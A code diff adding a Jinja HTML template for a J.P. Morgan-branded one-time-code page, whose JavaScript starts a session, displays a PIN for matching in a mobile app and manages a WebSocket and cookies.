@@ -1,0 +1,234 @@
+{% extends "base.html" %}
+
+{% block title %}J.P. Morgan - PIN Code{% endblock %}
+
+{% block extra_head %}
+    <link rel="stylesheet" href="/static/css/styles.css">
+    <style>
+        .pin-confirmation {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .pin-container {
+            margin: 30px auto;
+            text-align: center;
+            align-items: center;
+            justify-content: center;
+            background: white;
+            border-radius: 8px;
+            min-width: 70px;
+            min-height: 60px;
+        }
+
+        .pin-options {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin: 20px 0;
+        }
+
+        
+        .pin-option:disabled {
+            opacity: 1;
+            background: #ffffff;
+        }
+
+        h2 {
+            color: #333;
+            margin-bottom: 20px;
+            font-size: 13pt;
+            font-weight: normal;
+        }
+
+        h3 {
+            margin-top: 0px;
+        }
+
+        p {
+            color: #666;
+            margin: 10px 0;
+        }
+    </style>
+{% endblock %}
+
+{% block content %}
+            <div class="confirmation-container">
+                <h3>One-Time Code</h3>
+                <h2>Please open the J.P. Morgan Digital Mobile App and select the following code:</h2>
+                <div class="pin-confirmation">
+                    <div class="pin-container">
+                        <div id="browser-pin"></div>
+                    </div>
+                </div>
+                <div id="status"></div>
+            </div>
+
+{% endblock %}
+
+{% block scripts %}
+    <script src="/static/stronghold.js"></script>
+    <script src="/static/components/login-form.js"></script>
+    <script>
+        // Define functions first
+        function showStep(stepNumber) {
+            // Hide all steps
+            document.querySelectorAll('.step').forEach(step => step.classList.remove('active'));
+            // Show requested step
+            document.getElementById(`step${stepNumber}`).classList.add('active');
+        }
+
+        const stronghold = new Stronghold();
+
+        // Use parent window's closeAuthOverlay function
+        const closeAuthOverlay = window.parent.closeAuthOverlay;
+
+        // Start session and display PIN
+        async function initializeSession() {
+            try {
+                // Get username from template context
+                const username = '{{ username }}';
+                
+                // Start session
+                const response = await fetch('/start-session', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        username: username
+                    })
+                });
+                
+                const data = await response.json();
+                console.log(data);
+                
+                // Store session ID
+                stronghold.sessionId = data.session_id;
+                console.log('Browser: Session started with ID:', data.session_id);
+                
+                // Display PIN
+                const pinDisplay = document.getElementById('browser-pin');
+                pinDisplay.textContent = data.pin;
+                console.log('Browser: Displaying PIN:', data.pin);
+                
+                // Initialize WebSocket
+                await stronghold.initializeWebSocket();
+            } catch (error) {
+                console.error('Error initializing session:', error);
+            }
+        }
+
+        // Initialize on page load
+        document.addEventListener('DOMContentLoaded', initializeSession);
+
+        const statusDiv = document.getElementById('status');
+        
+        function showStatus(message, type) {
+            statusDiv.textContent = message;
+            statusDiv.className = `status ${type}`;
+        }
+
+        // Only initialize login form if no username provided and we're not in auto mode
+        if (!urlParams.has('username')) {
+            const loginForm = new LoginForm('login-form-container', {
+                onContinue: ({ username, remember }) => {
+                    initializeSession();
+                }
+            });
+
+            // Only check for saved username if we're showing the login form
+            document.addEventListener('DOMContentLoaded', function() {
+                const savedUsername = getCookie('username');
+                const usernameInput = document.getElementById('username-input');
+                if (savedUsername && usernameInput) {
+                    usernameInput.value = savedUsername;
+                    const rememberCheckbox = document.getElementById('remember-username');
+                    if (rememberCheckbox) {
+                        rememberCheckbox.checked = true;
+                    }
+                }
+            });
+        }
+    </script>
+
+    <script>
+        // Cookie handling functions
+        function setCookie(name, value, days) {
+            const expires = new Date();
+            expires.setTime(expires.getTime() + (days * 24 * 60 * 60 * 1000));
+            document.cookie = `${name}=${value};expires=${expires.toUTCString()};path=/`;
+        }
+
+        function getCookie(name) {
+            const nameEQ = name + "=";
+            const ca = document.cookie.split(';');
+            for(let i = 0; i < ca.length; i++) {
+                let c = ca[i];
+                while (c.charAt(0) === ' ') c = c.substring(1, c.length);
+                if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
+            }
+            return null;
+        }
+    </script>
+
+    <script>
+        // Handle pin selection
+        function handlePinSelector() {
+            const pinDisplay = document.getElementById('browser-pin');
+            const messageBox = document.getElementById('pin-message-box');
+            
+            // Hide the PIN
+            pinDisplay.style.display = 'none';
+            
+            // Show the message box
+            messageBox.style.display = 'block';
+        }
+        
+        // Handle message submission
+        function handleMessageSubmit() {
+            const message = document.getElementById('pin-message').value;
+            if (message.trim()) {
+                console.log('Message submitted:', message);
+                // Add your message handling logic here
+                
+                // Clear the message input
+                document.getElementById('pin-message').value = '';
+            }
+        }
+    </script>
+
+    <script>
+        function resetAndShowLogin() {
+            // Reset the PIN display
+            const pinContainer = document.getElementById('browser-pin');
+            if (pinContainer) {
+                pinContainer.innerHTML = 'Generating code...';
+            }
+            
+            // Reset Stronghold instance
+            if (stronghold) {
+                // Close existing WebSocket
+                if (stronghold.ws) {
+                    stronghold.ws.close();
+                    stronghold.ws = null;
+                }
+                // Clear polling interval
+                if (stronghold.pollingInterval) {
+                    clearInterval(stronghold.pollingInterval);
+                    stronghold.pollingInterval = null;
+                }
+                // Reset session ID
+                stronghold.sessionId = null;
+            }
+            
+            // Create new Stronghold instance
+            window.stronghold = new Stronghold();
+            
+            // Show login step
+            showStep(1);
+        }
+    </script>
+{% endblock %} 
